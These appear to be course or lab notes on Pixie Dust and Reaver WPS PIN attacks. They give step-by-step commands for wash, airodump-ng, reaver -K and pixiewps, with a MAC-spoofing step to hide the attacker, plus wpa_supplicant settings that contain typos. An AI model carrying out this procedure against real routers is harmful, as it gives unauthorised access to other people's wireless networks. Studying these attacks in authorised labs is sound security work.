Pixie-Reaver / Pixie Dust / Bully
----------------
WPS Brute force attack


On Laptop and Pi
----------------------------
sudo apt install pixiewps

Pixiewps is a tool that attacks a flaw in the randomization of WPS hashes

sudo apt install reaver

Reaver is an old school way to defeat WPS hashes, the noraml attack has since been patched on most wireless access points
Reaver can be combined with pixiewps for attacks that still work on WPS today!

WPS PIN Breakdown
----
Total of 10,000,000 unique WPS pin possibilities
You used to be able to brute force this with Reaver in a few minutes, since patched (2013)
Now you get locked out after a few attempts
It is rare to find a router that is vulnerable to brute force the WPS pin

WPS Defeat

https://tacticalware.com/list-of-wireless-ap-router-invulnerable-to-pixie-dust-attack/

Pixiedust attacks works against a good amount of TP-Link and other routers
It is nearly impossible to tel exactly what percentage of routers are vulnerable to this, since those stats are not commonly kept
The only way to know for sure, is to test every other router you can get your hands on
Above is a hacking forum that maintauns a list of SUPPOSEDLY vulnerable devices

Six Variables Required
--------
PKE - Public key enrollee (Message 1)
E-Nonce - Messages 1 and 2 (used to match M1/M2)
PKR - (public key registrar) Message 2
R-Nonce - Message 2 and 3 (used to match M2/M3) --Not needed for pixiewps, optional
E-Hash 1 - Message 3
E-hash 2 - Message 3
Authkey - only seen in the terminal that you ran Reaver on

Overview of EAP Messages
---------------------------
Message 1
  PKE
  E-Nonce
Message 2 
  E-Nonce
  PKR
  R-Nonce (not needed for pixiewps)
Message 3
  R-Nonce (not needed for pixiewps)
  E-Hash 1
  E-Hash 2

WASH Program
----------------------------
You can use the program "wash" to identify Access Points that have WPS enabled
sudo apt install wash (does not work anymore, needs added to the repository)
sudo snap install wash --edge

sudo wash -i <interface>

Reaver
----------
REAVER WILL ACCESS THE NETWORK AND EXPOSE DEVICE INFORMATION
*Always run macchanger on the Alfa Card prior to attack process

Terminal 1:
sudo airodump-ng -c <CHANNEL>  --bssid <MAC> -w <FILENAME> <interface>

Pipe this collection interface into Wireshark as well

Terminal 2:
sudo reaver -i <different interface> -b <BSSID> -c <CHANNEL> -K -S -vvv (-K is to run the Piixe after the Reaver) (-S is to use small frames) (-vvv is to be very verbose)
DO NOT CLOSE THE REAVER TERMINAL WITHOUT COPYING THE AUTHKEY

Theoretically, at this point Reaver should automatically pipe all the information into Pixiewps and crack the pin

Pixiewps
--------------
Terminal 3:
pixiewps -e <PKE> -r <PKR> -m <RNONCE> -n <ENONCE> -s <EHASH1> -z <EHASH2> -a <AUTHKEY> (take all the spaces out of the authkey)

Must ensure that you have M1, M2, and M3
We can pull the hashes out of each message to run pixiewps

wpa_supplicant.conf
---------------
Terminal 4:
First, we will edit or create a file called wpa_supplicant.conf
Make a backup of your existing one!
cd /etc/wpa_supplicant
sudo vim wpa_supplicant.conf

Change the document to have the following
ctrl_interface=/var/run/spa_supplicant
ctrl_inteface_group=0
update_config=1

WPS Commands
-------------
Next we will do an ifconfig to ensure we only have one wireless card up
sudo ifconfig <interface> down

Bring down your NetworkManager.service
sudo systemctl stop NetworkManager.service

not necessary and not on slides but could be useful
(rfkill unblock wlan)
